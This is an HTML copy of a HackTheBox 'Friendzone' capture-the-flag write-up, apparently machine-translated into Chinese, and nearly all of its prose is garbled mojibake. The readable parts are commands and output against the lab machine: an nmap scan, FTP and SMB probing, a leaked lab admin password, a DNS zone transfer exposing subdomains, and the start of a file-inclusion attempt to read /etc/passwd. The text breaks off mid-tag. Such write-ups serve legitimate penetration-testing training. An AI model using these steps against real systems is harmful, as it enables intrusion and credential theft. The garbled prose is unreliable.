<html>
<head>
<title>HacktheBox â€” Friendzone</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­â€”â€”å‹è°Šåœ°å¸¦</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/hackthebox-friendzone-9c52df249dcd?source=collection_archive---------0-----------------------#2019-07-13">https://infosecwriteups.com/hackthebox-friendzone-9c52df249dcd?source=collection_archive---------0-----------------------#2019-07-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="32d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯ä¸€ç¯‡å…³äºæˆ‘å¦‚ä½•ä»HacktheBoxä¸­è§£å†³æ¡†Friendzoneçš„æ–‡ç« ã€‚</p><p id="8573" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>æ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œç»ƒä¹ æ¸—é€æµ‹è¯•æŠ€èƒ½ã€‚</p><p id="0139" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ­£å¦‚æˆ‘ä¸€ç›´åšçš„é‚£æ ·ï¼Œæˆ‘è¯•å›¾è§£é‡Šæˆ‘æ˜¯å¦‚ä½•ä»æœºå™¨ä¸Šç†è§£è¿™é‡Œçš„æ¦‚å¿µçš„ï¼Œå› ä¸ºæˆ‘æƒ³çœŸæ­£ç†è§£äº‹ç‰©æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æ‰€ä»¥è¯·ï¼Œå¦‚æœæˆ‘è¯¯è§£äº†ä¸€ä¸ªæ¦‚å¿µï¼Œè¯·è®©æˆ‘çŸ¥é“ã€‚éå¸¸æ¬¢è¿æ‚¨çš„æŒ‡æ­£ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/11a7e518cddf6b5a3fd27a82ec054a43.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/1*3fouiVW6YlXMLTmFpTXfdg.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">æ¥æº:hackthebox.eu</figcaption></figure><h1 id="c7da" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">å…³äºç›’å­</h1><p id="75f5" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">è¿™ä¸ªç›’å­å¾ˆæœ‰è¶£ï¼Œä½†åŒæ—¶ä¹Ÿå¾ˆæ£’ã€‚è¿™æ˜¯æˆ‘è§£å†³çš„æ—©æœŸç®±å­ä¹‹ä¸€ã€‚å®ƒåˆ©ç”¨é€‚å½“çš„æšä¸¾ï¼Œç„¶åä½ åº”è¯¥èƒ½å¤Ÿè¿æ¥è¿™äº›ç‚¹ã€‚</p><h1 id="33c8" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">#TLDR</h1><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="09c8" class="mg kz iq mc b gy mh mi l mj mk">Initial foothold: DNS enumeration leads to a login page, where credentials to be used are found thru SMB<br/>User: LFI of the file upload from SMB<br/>Root: DLL Hijacking of a regularly running file importing a world-writeable library</span></pre><h1 id="6e6a" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">#æœ€åˆçš„ç«‹è¶³ç‚¹</h1><p id="3b9e" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘è¿è¡ŒNmapæ‰«æï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æˆ‘çš„Nmapç›®å½•ä¸­:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="2082" class="mg kz iq mc b gy mh mi l mj mk">nmap -sV -sC -oA nmap/initial 10.10.10.123</span></pre><p id="6f19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="583d" class="mg kz iq mc b gy mh mi l mj mk">Nmap scan report for 10.10.10.123<br/>Host is up (0.29s latency).<br/>Not shown: 993 closed ports<br/>PORT    STATE SERVICE     VERSION<br/>21/tcp  open  ftp         vsftpd 3.0.3<br/>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)<br/>|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)<br/>|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)<br/>53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)<br/>| dns-nsid: <br/>|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu<br/>80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: Friend Zone Escape software<br/>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>443/tcp open  ssl/http    Apache httpd 2.4.29<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: 404 Not Found<br/>| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br/>| Not valid before: 2018-10-05T21:02:30<br/>|_Not valid after:  2018-11-04T21:02:30<br/>|_ssl-date: TLS randomness does not represent time<br/>| tls-alpn: <br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>|   http/1.1<br/>&lt;redacted&gt;<br/>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="d4f7" class="mg kz iq mc b gy ml mi l mj mk">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="a9e2" class="mg kz iq mc b gy ml mi l mj mk">Host script results:<br/>|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s<br/>|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>| smb-os-discovery: <br/>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br/>|   Computer name: friendzone<br/>|   NetBIOS computer name: FRIENDZONE\x00<br/>|   Domain name: \x00<br/>|   FQDN: friendzone<br/>|_  System time: 2019-03-06T09:13:45+02:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2019-03-05 23:13:43<br/>|_  start_date: N/A</span><span id="29f4" class="mg kz iq mc b gy ml mi l mj mk">Service detection performed. Please report any incorrect results at <a class="ae kl" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/># Nmap done at Tue Mar  5 23:45:44 2019 -- 1 IP address (1 host up) scanned in 1972.54 seconds</span></pre><p id="9544" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥å¼€æ”¾ç«¯å£æ˜¯21ã€22ã€53ã€80ã€139ã€443ã€445ã€‚</p><p id="433b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®¿é—®ç«¯å£80æ—¶ï¼Œæˆ‘çœ‹åˆ°äº†è¿™ä¸ªé¡µé¢:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mm"><img src="../Images/df9e5edab9c4381a4c7f480549a0e450.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QRVzES1QSXbExHGzrpQ3fQ.png"/></div></div></figure><p id="aeb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®ƒè°ˆåˆ°äº†ç¦»å¼€è¿™ä¸ªåŒºåŸŸå’Œä¸€ä¸ªè”ç³»ç”µå­é‚®ä»¶ã€‚æˆ‘è¯•ç€è¿›å…¥friendzoneportal.redä½†æ˜¯æˆ‘è®¤ä¸ºå®ƒæ²¡æœ‰å…³è”ã€‚è‹±é›„è”ç›Ÿ</p><p id="4c60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºFTPä¹Ÿæ˜¯å¼€æ”¾çš„ï¼Œæˆ‘å°è¯•æ˜¯å¦å¯ä»¥åŒ¿åç™»å½•ï¼Œä½¿ç”¨åŒ¿åä½œä¸ºç”¨æˆ·åå’ŒåŸºæœ¬ä¸Šä»»ä½•å¯†ç ã€‚</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="86da" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): anonymous<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt;</span></pre><p id="a34e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸å…è®¸åŒ¿åç™»å½•ï¼Œæ‰€ä»¥æˆ‘ç»§ç»­ä½¿ç”¨SMBæšä¸¾ã€‚æˆ‘ä½¿ç”¨smbclientæ¥åˆ—å‡ºè‚¡ä»½:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6287" class="mg kz iq mc b gy mh mi l mj mk">smbclient -L 10.10.10.123</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mr"><img src="../Images/65ee488170197099f05fa2f1e83e6c09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RVi4cDn7cAeNrWaZ8C16cQ.png"/></div></div></figure><p id="9c70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ–‡ä»¶å…±äº«åï¼Œçªå‡ºçš„æ˜¯/etc/æ–‡ä»¶ã€‚è¿™å¯¹ä»¥åå¾ˆé‡è¦ã€‚ç„¶åï¼Œæˆ‘è¯•å›¾è®¿é—®å…±äº«æ–‡ä»¶ï¼Œä½†è®¿é—®è¢«æ‹’ç»ã€‚æˆ‘ç”¨smbmapçœ‹æƒé™ã€‚è¿™å°±æ˜¯smbmapçš„å¥½å¤„ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ms"><img src="../Images/ad37f483cdefb5e0b2cd97830b5c7422.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fKeQpKuLHBKTmtkJll0hRA.png"/></div></div></figure><p id="a5f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">çœ‹åˆ°æˆ‘èƒ½è¯»å’Œå†™çš„åœ°æ–¹ï¼Œæˆ‘åœ¨å…±äº«ä¸­å¯»æ‰¾æœ‰ç”¨çš„æ–‡ä»¶ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mt"><img src="../Images/b111d68906477f1334204f010324b51e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ju3qNWCHcLv57giRr-g3xg.png"/></div></div></figure><p id="b832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘èƒ½å¤Ÿä»é€šç”¨å…±äº«ä¸­æ£€ç´¢åˆ°ä¸€ä¸ªcreds.txtæ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘è¿˜å°è¯•åœ¨æˆ‘ä»¬æœ‰å†™æƒé™çš„å…±äº«(å¼€å‘å…±äº«)ä¸Šä¸Šä¼ æ–‡ä»¶ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mu"><img src="../Images/ecc3bbe9597a0ba676589bb83883bc5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KmCbUmlD6B5XIGUEeyu9aQ.png"/></div></div></figure><p id="e0a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰“å¼€creds.txt:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="e1f4" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup cat creds.txt <br/>creds for the admin THING:</span><span id="8d73" class="mg kz iq mc b gy ml mi l mj mk">admin:WORKWORKHhallelujah@#</span></pre><p id="4280" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å°è¯•ä½¿ç”¨å‡­è¯è®¿é—®FTPå’ŒSMBæœåŠ¡ï¼Œä½†å®ƒä¸èµ·ä½œç”¨ã€‚</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="8ef5" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): admin<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.</span></pre><p id="6998" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“åœ¨å“ªé‡Œå¯ä»¥ä½¿ç”¨å‡­è¯ï¼Œæ‰€ä»¥æˆ‘è½¬åˆ°HTTPã€‚ä»nmapç»“æœæ¥çœ‹ï¼Œç«™ç‚¹çš„commonNameæ˜¯friendzone.redï¼Œè€Œä¸æ˜¯friendzoneportal.redã€‚å¦å¤–ï¼Œæˆ‘è¿˜çœ‹åˆ°äº†åˆ›å»ºè¯ä¹¦ä»¥è®¿é—®HTTPSä¸­çš„ä¿¡æ¯ã€‚ç„¶åï¼Œæˆ‘å°†friendzone.redæ·»åŠ åˆ°æˆ‘çš„/etc/hostsæ–‡ä»¶ä¸­ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mv"><img src="../Images/faa368bd450ef1b4e5b4340c9e7ef237.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xrKq8U0av1YH0p9mXiQEQQ.png"/></div></div></figure><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="7a31" class="mg kz iq mc b gy mh mi l mj mk">10.10.10.123    friendzone.red</span></pre><p id="f5db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬åˆ°ç«¯å£80æ˜¾ç¤ºç›¸åŒçš„é¡µé¢:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mw"><img src="../Images/5827e842eb4075180b77fe202def1351.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FjtdZunw3_bFcT5BkDoSsg.png"/></div></div></figure><p id="16dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦ä¸€ä¸ªå¼€æ”¾ç«¯å£æ˜¯53ï¼Œè¿™æ˜¯DNSã€‚ç°åœ¨å¤§éƒ¨åˆ†äººéƒ½çŸ¥é“53ç«¯å£åªæœ‰DNS UDPï¼Œä¸çŸ¥é“è¿˜æœ‰TCPã€‚</p><p id="c8c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS TCPç”¨äºåŒºåŸŸä¼ è¾“ï¼Œæˆ–è€…å½“å“åº”å¤§å°è¶…è¿‡512å­—èŠ‚é™åˆ¶æ—¶ä½¿ç”¨ã€‚åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºRFCçš„ä¿¡æ¯:ã€https://tools.ietf.org/html/rfc7766<a class="ae kl" href="https://tools.ietf.org/html/rfc7766" rel="noopener ugc nofollow" target="_blank">ã€‚</a></p><p id="1da4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åï¼Œæˆ‘å°è¯•ä½¿ç”¨å¸¦æœ‰axfr(ç”¨äºåŒºåŸŸè½¬ç§»)æ ‡å¿—çš„digè¿›è¡ŒåŒºåŸŸè½¬ç§»ï¼Œä»DNSæœåŠ¡å™¨10.10.10.123æŸ¥è¯¢friendzone.red(å› ä¸ºHTBæœºå™¨çš„DNSæœåŠ¡å™¨ä¸å®ƒä»¬çš„IPç›¸åŒ):</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="25ad" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup dig axfr friendzone.red <a class="ae kl" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.123</span><span id="77e3" class="mg kz iq mc b gy ml mi l mj mk">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red <a class="ae kl" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.123<br/>;; global options: +cmd<br/>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br/>friendzone.red.         604800  IN      AAAA    ::1<br/>friendzone.red.         604800  IN      NS      localhost.<br/>friendzone.red.         604800  IN      A       127.0.0.1<br/>administrator1.friendzone.red. 604800 IN A      127.0.0.1<br/>hr.friendzone.red.      604800  IN      A       127.0.0.1<br/>uploads.friendzone.red. 604800  IN      A       127.0.0.1<br/>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span></pre><p id="0e98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºå®ƒçš„å·¥ä½œï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥çœ‹åˆ°å­åŸŸã€‚æ—¢ç„¶æˆ‘ä»¬åˆ—ä¸¾äº†å…¶ä»–å­åŸŸï¼Œæˆ‘ä»¬åº”è¯¥å°†å®ƒä»¬æ·»åŠ åˆ°/etc/hostsæ–‡ä»¶ä¸­:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="c82f" class="mg kz iq mc b gy mh mi l mj mk">10.10.10.123    friendzone.red administrator1.friendzone.red \ hr.friendzone.red uploads.friendzone.red</span></pre><p id="5824" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬åˆ°hr.friendzone.red:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mx"><img src="../Images/1b8d8b2d753fc648b43f4f166f630f0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ymchst_ouAvAhffgD7T0gQ.png"/></div></div></figure><p id="61fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬åˆ°uploads.friendzone.red(æ³¨æ„æˆ‘ä»¬å¾—åˆ°çš„æ˜¯httpsï¼Œè€Œä¸æ˜¯æ¥è‡ªhrå­åŸŸçš„http):</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi my"><img src="../Images/130b45d0cb1002b427319102460bd4a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ANUHSbQHxWcDB4VWmNCtIQ.png"/></div></div></figure><p id="759a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¯•ç€ä¸Šä¼ ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒæˆåŠŸäº†ã€‚è‡³å°‘æˆ‘çŸ¥é“æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ä¸Šä¼ æ–‡ä»¶(é€šè¿‡è¿™ä¸ªé¡µé¢å’ŒSMB)ï¼Œä½†æˆ‘ä¸çŸ¥é“å®ƒä»¬å­˜å‚¨åœ¨å“ªé‡Œã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mr"><img src="../Images/d1ef7d00b9581d1b0cad3a832c24a012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R9JSQEp-KdnpKabUwl0qTw.png"/></div></div></figure><p id="994f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬åˆ°administrator1.friendzone.redï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªç™»å½•é¡µé¢:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mz"><img src="../Images/f3f5a21dd01cc9092c8dcb81f1c828f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*27bb2DhANGOKlnzMwdZkIg.png"/></div></div></figure><p id="44cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä½¿ç”¨äº†å‡­è¯ï¼Œå¹¶ä¸”æˆåŠŸäº†:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="97ef" class="mg kz iq mc b gy mh mi l mj mk">admin:WORKWORKHhallelujah@#</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi na"><img src="../Images/467695bc4303dad675747ffba0171e64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J9aqpbXJ7Go_wpNiGidJYg.png"/></div></div></figure><h1 id="63b8" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">è·å–ç”¨æˆ·:</h1><p id="364b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ï¼Œæˆ‘ä»¬æ­£åœ¨å¤„ç†ä¸€ä¸ªåˆå­¦è€…phpå¼€å‘äººå‘˜ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nb"><img src="../Images/5dfc8845b22d7d65f4e741bd2c70c14e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dSJYYZ9oTazogUjDIseKKQ.png"/></div></div></figure><p id="8efe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘åªæ˜¯æŒ‰ç…§æ‰€è¯´çš„è®¿é—®å›¾ç‰‡<strong class="jp ir">a.jpg</strong>å’Œé¡µé¢<strong class="jp ir">åç§°æ—¶é—´æˆ³</strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nc"><img src="../Images/7a219d0ee75cdacb9d2b50b80a730660.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aj9A8KSKko4Igb2ZSDk-hA.png"/></div></div></figure><p id="eb57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨å·¦ä¸‹è§’å¾—åˆ°ä¸€ä¸ªâ€œæœ€ç»ˆè®¿é—®æ—¶é—´æˆ³æ˜¯â€ã€‚å®ƒæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œæˆ‘æ£€æŸ¥äº†å®ƒçš„çºªå…ƒæ—¶é—´ï¼Œå®ƒä½¿ç”¨1970å¹´1æœˆ1æ—¥ä½œä¸ºå‚è€ƒã€‚è¿™æ„å‘³ç€webæœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªè„šæœ¬åœ¨åšè¿™ä»¶äº‹ã€‚</p><p id="e685" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºå‘½åçº¦å®šæ˜¯â€œ<strong class="jp ir"> letter.jpgâ€ï¼Œ</strong>æˆ‘è¯•ç€æ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªåä¸ºb.jpgçš„æ–‡ä»¶:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nd"><img src="../Images/e55b7b195183a3d72f57067e60c2a2ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ob6LQP9J_c_dDURAqUwiJQ.png"/></div></div></figure><p id="9e0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ‰ã€‚æˆ‘æŒ‰CTRL + uæŸ¥çœ‹æºä»£ç :</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ne"><img src="../Images/5139e5de95088f74ab75691ef325479a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CT2QwXyioscKlXMuerOuog.png"/></div></div></figure><p id="59e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘çœ‹åˆ°å®ƒä»¬å­˜å‚¨åœ¨imagesæ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶ä¸”åªæœ‰ä¸¤å¼ å›¾ç‰‡(aå’Œb)ã€‚æˆ‘è¯•ç€è®¿é—®z.jpgï¼Œçœ‹çœ‹å®ƒä¼šæœ‰ä»€ä¹ˆååº”:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nf"><img src="../Images/b9304e155bfab419d18f9e5fa5b97e15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CJQ9ZEb3sNEutNc71_eGSQ.png"/></div></div></figure><p id="2869" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› ä¸ºæœ‰ä¸€ä¸ªé”™è¯¯ï¼Œæˆ‘é€šè¿‡å°è¯•è¯»å–etc/passwdæ¥æµ‹è¯•è¿™æ˜¯å¦å®¹æ˜“å—åˆ°LFI(æœ¬åœ°æ–‡ä»¶åŒ…å«)çš„æ”»å‡»ã€‚æˆ‘æ²¡æœ‰è¾“å‡º:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ng"><img 